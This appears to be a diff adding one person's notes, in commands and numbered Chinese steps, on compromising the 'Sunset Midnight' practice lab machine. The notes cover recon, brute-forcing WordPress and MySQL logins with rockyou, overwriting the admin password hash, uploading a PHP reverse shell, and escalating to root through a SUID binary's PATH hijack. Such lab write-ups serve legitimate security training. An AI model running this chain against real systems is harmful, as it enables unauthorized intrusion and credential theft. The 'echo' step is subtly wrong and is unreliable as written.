@@ -1,0 +1,32 @@
+nmap -sV -sC -Pn 192.168.189.88 > nmap.txt
+
+cewl http://sunset-midnight/ > passlistabout
+
+wpscan --url sunset-midnight --usernames admin --passwords /home/kali/timmy/OSPG/SunsetMidnight/passlistabout --max-threads 50 --max-threads 50
+gobuster dir  -u http://192.168.189.11/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi  > gobuster.txt
+
+
+
+
+1.nmap掃描到80端口發現是word-press
+2.找到wp-admin後台使用rockyou暴力破解失敗
+wpscan --url sunset-midnight --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50 --max-threads 50
+3.3306端口有MySQL 使用hydra嘗試破解成功找到帳密 host: sunset-midnight   login: root   password: robert
+hydra  -l root -P /usr/share/wordlists/rockyou.txt sunset-midnight mysql -t 4
+4.登入MySQL後破解hash的密碼不成功
+mysql -u root -p -h sunset-midnight
+hashcat -m 400 hash  /usr/share/wordlists/rockyou.txt
+5.嘗試修改wordpress密碼 $P$BeOfRd4RvUrEB.wG3xlHtVAXg1Gxm1/:monkey
+UPDATE wp_users SET user_pass="$P$BeOfRd4RvUrEB.wG3xlHtVAXg1Gxm1/" WHERE ID=1;
+6.取得wp-amin後台權限後,上傳reverse.php到Theme後訪問以下取得reverse shell
+http://sunset-midnight/wp-content/uploads/2021/06/
+7.在wp-config下找到jose 密碼645dc5a8871d2a4269d4cbe23f6ae103
+8.切換到jose後執行LinEnum.sh發現 /usr/bin/status 有SUID權限
+9. /usr/bin/status 內容有 service ssh status ,因為service沒有指定完整路徑可以做hijack
+10. 在tmp/下建立service 內容為/bin/bash
+echo "/bin/bash > service"
+chmod +x service
+export PATH=/tmp:$PATH
+11.執行/usr/bin/status取得root權限
+
+
